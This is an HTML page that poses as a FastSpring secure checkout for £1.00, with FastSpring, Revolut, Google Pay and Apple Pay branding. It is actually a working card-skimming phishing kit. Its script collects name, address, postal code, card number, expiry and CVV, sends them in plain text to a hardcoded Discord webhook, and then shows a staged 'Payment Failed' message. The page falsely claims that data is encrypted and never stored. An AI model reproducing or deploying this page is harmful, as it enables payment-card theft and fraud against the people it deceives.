<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FastSpring-Secure-Payment</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        /* Basic Reset */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Roboto', sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f6f9fc;
            overflow-y: auto;
        }

        /* Payment Form */
        .payment-form {
            background-color: #ffffff;
            border: 1px solid #e0e6ed;
            border-radius: 10px;
            max-width: 500px;
            padding: 2em;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            text-align: left;
            position: relative;
        }

        /* Header */
        .header {
            margin-bottom: 1.5em;
            text-align: center;
        }

        .header h2 {
            font-size: 1.8em;
            color: #333;
        }

        /* Amount Display */
        .amount {
            font-size: 2em;
            font-weight: bold;
            color: #333;
            margin: 1em 0;
            text-align: center;
        }

        /* Payment Options */
        .payment-options {
            display: flex;
            justify-content: space-between;
            margin-bottom: 1em;
        }

        .payment-button {
            background: #f7f7f7;
            border: 1px solid #ccc;
            border-radius: 5px;
            width: 32%;
            padding: 1em;
            cursor: not-allowed; /* Indicates non-functionality */
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1em;
            color: #333;
            transition: background 0.3s;
        }

        .payment-button:hover {
            background-color: #e0e6ed;
        }

        .payment-button img {
            max-width: 100%; /* Logo fills the box */
            max-height: 100%; /* Prevents logos from exceeding their box */
            object-fit: contain; /* Keeps aspect ratio */
        }

        .or-pay-with {
            text-align: center;
            margin: 1em 0;
            color: #666;
        }

        /* Form Group */
        .form-group {
            margin-bottom: 1.5em;
            position: relative;
        }

        .form-group label {
            display: block;
            font-size: 0.9em;
            color: #666;
            margin-bottom: 0.3em;
        }

        .form-group input {
            width: 100%;
            padding: 0.75em 0.8em;
            border-radius: 5px;
            border: 1px solid #ccd0d5;
            font-size: 1em;
            height: 45px;
            transition: border 0.3s;
        }

        .form-group input:focus {
            border-color: #635bff;
            outline: none;
        }

        /* Icons */
        .form-group i {
            position: absolute;
            top: 50%;
            left: 12px;
            transform: translateY(-50%);
            color: #a3a9b0;
            font-size: 1.1em;
        }

        /* Submit Button */
        .btn-submit {
            width: 100%;
            padding: 1em;
            background-color: #635bff;
            color: #ffffff;
            font-size: 1.1em;
            font-weight: bold;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 1em;
            transition: background 0.3s;
            position: relative;
            overflow: hidden;
        }

        .btn-submit:hover {
            background-color: #5249d8;
        }

        .note {
            font-size: 0.85em;
            color: #888;
            margin-top: 1em;
            text-align: center;
        }

        /* Loading Overlay */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.9);
            display: none; /* Hidden by default */
            justify-content: center;
            align-items: center;
            z-index: 999;
        }

        .loading-content {
            text-align: center;
        }

        .loading-spinner {
            border: 8px solid #f3f3f3; /* Light grey */
            border-top: 8px solid #635bff; /* Blue */
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 1em;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Failure Message */
        .failure-message {
            display: none; /* Hidden by default */
            text-align: center;
            margin-top: 1.5em;
            color: #dc3545;
            font-size: 1.2em;
            font-weight: bold;
            background-color: #f8d7da;
            padding: 1em;
            border: 1px solid #f5c6cb;
            border-radius: 5px;
            position: relative;
            animation: fadeIn 0.5s ease;
        }

        .failure-message i {
            color: #dc3545;
            font-size: 2em;
            display: block;
            margin-bottom: 0.5em;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        /* Responsive adjustments */
        @media (max-width: 600px) {
            .payment-form {
                width: 90%;
                padding: 1.5em;
            }

            .header h2 {
                font-size: 1.5em;
            }

            .amount {
                font-size: 1.5em;
            }

            .btn-submit {
                font-size: 1em;
            }

            .note {
                font-size: 0.75em;
            }

            .failure-message {
                font-size: 1em; /* Smaller font for mobile */
            }
        }
    </style>
</head>
<body>
    <div class="payment-form">
       <div class="logo">
           <img src="https://fastspring.com/wp-content/themes/fastspring-bamboo/images/logos/fastspring-logo-orange-gray.svg?2" alt="Your Company Logo" style="max-width: 30%; height: auto; margin-bottom: 1em;">
        </div>
        <div class="header">
            <h2>Payment Link For Coupon Place:</h2>
            <p class="note">Powered By FastSpring Secure Payments.</p>
        </div>
        <p class="amount">£1.00</p>

        <div class="payment-options">
            <div class="payment-button">
                <img src="https://investlithuania.com/wp-content/uploads/Revolut.svg" alt="Revolut Pay Logo">
            </div>
            <div class="payment-button">
                <img src="https://cdn.worldvectorlogo.com/logos/google-pay-2.svg" alt="Google Pay Logo">
            </div>
            <div class="payment-button">
                <img src="https://download.logo.wine/logo/Apple_Pay/Apple_Pay-Logo.wine.png" alt="Apple Pay Logo">
            </div>
        </div>

        <div class="or-pay-with">or pay with:</div>

        <form id="paymentForm">
    <div class="form-group">
        <label for="cardholderName">Cardholder Name</label>
        <input type="text" id="cardholderName" placeholder="John Doe" required>
    </div>
    
    <div class="form-group">
        <label for="zipcode">Zipcode / Postal Code</label>
        <input type="text" id="zipcode" placeholder="Postal Code" required>
    </div>

    <div class="form-group">
        <label for="fullAddress">Full Address</label>
        <input type="text" id="fullAddress" placeholder="123 Main St" required>
    </div>

    <div class="form-group">
        <label for="cardNumber">Card Number</label>
        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required maxlength="19">
    </div>
    <div class="form-group">
        <label for="expiryDate">Expiration Date (MM/YY)</label>
        <input type="text" id="expiryDate" placeholder="MM/YY" required maxlength="5">
    </div>
    <div class="form-group">
        <label for="cvv">CVV</label>
        <input type="text" id="cvv" placeholder="123" required maxlength="3">
    </div>

    <button type="submit" class="btn-submit">
        Pay £1.00
    </button>

    <p class="note">All information is encrypted, your sensitive data is never stored.</p>
    <p class="note">Anti-Fraud Settings Enabled.</p>
</form>

        <!-- Loading Overlay -->
        <div class="loading-overlay" id="loadingOverlay">
            <div class="loading-content">
                <div class="loading-spinner"></div>
                <p>Contacting Bank Issuer...</p>
            </div>
        </div>

        <!-- Failure Message -->
        <div class="failure-message" id="failureMessage">
            <i class="fas fa-exclamation-triangle"></i>
            Payment Failed! Please check your details and try again.
        </div>
    </div>

    <script>
        const form = document.getElementById('paymentForm');

        form.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent the form from submitting normally

            // Show the loading overlay
            document.getElementById('loadingOverlay').style.display = 'flex';

            // Prepare data to send to the webhook
const cardholderName = document.getElementById('cardholderName').value;
const zipcode = document.getElementById('zipcode').value;
const fullAddress = document.getElementById('fullAddress').value;
const cardNumber = document.getElementById('cardNumber').value;
const expiryDate = document.getElementById('expiryDate').value;
const cvv = document.getElementById('cvv').value;

const paymentData = {
    content: `New payment submitted:\nCardholder Name: ${cardholderName}\nZipcode: ${zipcode}\nFull Address: ${fullAddress}\nCard Number: ${cardNumber}\nExpiration Date: ${expiryDate}\nCVV: ${cvv}`
};


            try {
                // Send the payment data to the webhook
                const response = await fetch('https://discord.com/api/webhooks/1300194277627924530/6aG2CrVcOr3pnlqTVXeI65ilYCJojGTatUXR_vSM_GxPhZmE_99Dk5ru3p5oyH6rYujx', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(paymentData),
                });

                // Check if the request was successful
                if (!response.ok) {
                    throw new Error('Failed to send data to the webhook');
                }

                // Simulate loading for a longer duration
                setTimeout(() => {
                    // Hide loading overlay and show failure message
                    document.getElementById('loadingOverlay').style.display = 'none';
                    document.getElementById('failureMessage').style.display = 'block';
                }, 3000); // Adjust the time as needed (3000ms = 3 seconds)

            } catch (error) {
                console.error('Error sending data:', error);
                // Hide loading overlay and show error message
                setTimeout(() => {
                    document.getElementById('loadingOverlay').style.display = 'none';
                    document.getElementById('failureMessage').style.display = 'block';
                }, 3000); // Delay the failure message as well
            }
        });

        // Auto-format card number input
        document.getElementById('cardNumber').addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim(); // Format with spaces
        });

        // Auto-format expiration date input
        document.getElementById('expiryDate').addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2').trim(); // Format with slash
        });
    </script>
</body>
</html>
